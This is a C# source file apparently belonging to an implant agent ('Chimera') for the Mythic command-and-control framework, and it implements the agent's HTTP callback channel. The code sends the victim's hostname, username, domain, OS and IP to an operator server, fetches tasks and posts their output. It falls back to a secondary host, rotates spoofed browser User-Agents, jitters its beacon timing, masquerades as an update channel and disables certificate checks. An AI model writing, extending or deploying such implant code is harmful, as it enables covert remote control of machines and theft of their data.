using System;
using System.Net;
using System.Net.Http;
using System.Text;

namespace Chimera
{
    // Mythic wire format when mythic_encrypts = True:
    // Send:    Base64( UUID[36 bytes] + plaintext_json )
    // Receive: Base64( UUID[36 bytes] + plaintext_json ) -- strip first 36 bytes
    //
    // Runtime-mutable fields (written by C2Config command):
    //   SecondaryURL  — fallback callback host; empty = disabled
    //   UaRotate      — randomly pick from UaPool each request
    //   JitterBase    — sleep seconds base (overrides Config.SleepInterval)
    //   JitterRange   — ±range added to JitterBase
    public static class C2Http
    {
        // -----------------------------------------------------------------------
        // Runtime-mutable C2 config — C2Config command writes directly to these.
        // -----------------------------------------------------------------------
        public static string SecondaryURL = "";
        public static bool   UaRotate     = false;
        public static int    JitterBase   = -1;  // -1 = use Config.SleepInterval
        public static int    JitterRange  = -1;  // -1 = use Config.Jitter %

        // Common browser User-Agents for rotation
        public static readonly string[] UaPool = new string[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Brave/1.65"
        };

        // -----------------------------------------------------------------------
        // HttpClient — recreated when UA rotation turns on/off.
        // -----------------------------------------------------------------------
        private static HttpClient _client = CreateClient(Config.UserAgent);
        private static readonly Random _rng = new Random();
        private static readonly object _lock = new object();

        private static HttpClient CreateClient(string ua)
        {
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback =
                (msg, cert, chain, errors) => true;
            var client = new HttpClient(handler);
            client.DefaultRequestHeaders.Add("User-Agent", ua);
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("X-Update-Channel", "stable");
            return client;
        }

        // -----------------------------------------------------------------------
        // Sleep helper — respects JitterBase/JitterRange when set by c2config.
        // -----------------------------------------------------------------------
        public static void Sleep()
        {
            int baseMs;
            int jitterPct;

            lock (_lock)
            {
                baseMs    = (JitterBase  >= 0 ? JitterBase  : Config.SleepInterval) * 1000;
                jitterPct =  JitterRange >= 0 ? JitterRange : Config.Jitter;
            }

            int maxDelta = (int)(baseMs * (jitterPct / 100.0));
            int actual   = baseMs + _rng.Next(-maxDelta, maxDelta + 1);
            if (actual < 500) actual = 500;
            System.Threading.Thread.Sleep(actual);
        }

        // -----------------------------------------------------------------------
        // Wire helpers
        // -----------------------------------------------------------------------
        private static string Wrap(string plaintext)
        {
            byte[] uuidBytes = Encoding.UTF8.GetBytes(Config.PayloadUUID);
            byte[] bodyBytes = Encoding.UTF8.GetBytes(plaintext);
            byte[] combined  = new byte[uuidBytes.Length + bodyBytes.Length];
            Buffer.BlockCopy(uuidBytes, 0, combined, 0, uuidBytes.Length);
            Buffer.BlockCopy(bodyBytes, 0, combined, uuidBytes.Length, bodyBytes.Length);
            return Convert.ToBase64String(combined);
        }

        private static string Unwrap(string base64Response)
        {
            byte[] combined = Convert.FromBase64String(base64Response);
            if (combined.Length <= 36) return null;
            return Encoding.UTF8.GetString(combined, 36, combined.Length - 36);
        }

        // -----------------------------------------------------------------------
        // Core send — tries primary, falls back to secondary if set and primary fails.
        // -----------------------------------------------------------------------
        public static string Send(string jsonMessage)
        {
            string wrapped = Wrap(jsonMessage);
            var content    = new StringContent(wrapped, Encoding.UTF8, "application/json");

            // Pick UA if rotation enabled
            HttpClient client;
            lock (_lock)
            {
                if (UaRotate)
                {
                    string ua = UaPool[_rng.Next(UaPool.Length)];
                    client = CreateClient(ua);
                }
                else
                {
                    client = _client;
                }
            }

            // Try primary URL
            string primary = Config.CallbackURL;
            string result  = TrySend(client, primary, content);
            if (result != null) return result;

            // Try secondary URL if set
            string secondary;
            lock (_lock) { secondary = SecondaryURL; }
            if (!string.IsNullOrEmpty(secondary))
            {
                var content2 = new StringContent(wrapped, Encoding.UTF8, "application/json");
                result = TrySend(client, secondary, content2);
            }

            return result;
        }

        private static string TrySend(HttpClient client, string url, StringContent content)
        {
            try
            {
                var response = client.PostAsync(url, content).GetAwaiter().GetResult();
                string body  = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                return Unwrap(body);
            }
            catch { return null; }
        }

        // -----------------------------------------------------------------------
        // Public API (unchanged surface for callers)
        // -----------------------------------------------------------------------
        public static string CheckIn()
        {
            string hostname = Dns.GetHostName();
            string username = Environment.UserName;
            string os       = Environment.OSVersion.ToString();
            int    pid      = System.Diagnostics.Process.GetCurrentProcess().Id;
            string arch     = Environment.Is64BitProcess ? "x64" : "x86";
            string domain   = Environment.UserDomainName;

            string json = string.Format(@"{{
                ""action"": ""checkin"",
                ""uuid"": ""{0}"",
                ""ips"": [""{1}""],
                ""os"": ""{2}"",
                ""user"": ""{3}\\{4}"",
                ""host"": ""{5}"",
                ""pid"": {6},
                ""architecture"": ""{7}"",
                ""domain"": ""{3}"",
                ""integrity_level"": 2,
                ""external_ip"": """"
            }}", Config.PayloadUUID, GetLocalIP(), os, domain, username, hostname, pid, arch);

            return Send(json);
        }

        public static string GetTasking(string callbackUUID)
        {
            string json = string.Format(@"{{
                ""action"": ""get_tasking"",
                ""tasking_size"": 1,
                ""uuid"": ""{0}""
            }}", callbackUUID);
            return Send(json);
        }

        public static string PostResponse(string callbackUUID, string taskID, string output)
        {
            string escaped = output
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "\\r")
                .Replace("\n", "\\n");

            string json = string.Format(@"{{
                ""action"": ""post_response"",
                ""uuid"": ""{0}"",
                ""responses"": [{{
                    ""task_id"": ""{1}"",
                    ""user_output"": ""{2}"",
                    ""completed"": true
                }}]
            }}", callbackUUID, taskID, escaped);
            return Send(json);
        }

        private static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch { }
            return "127.0.0.1";
        }
    }
}
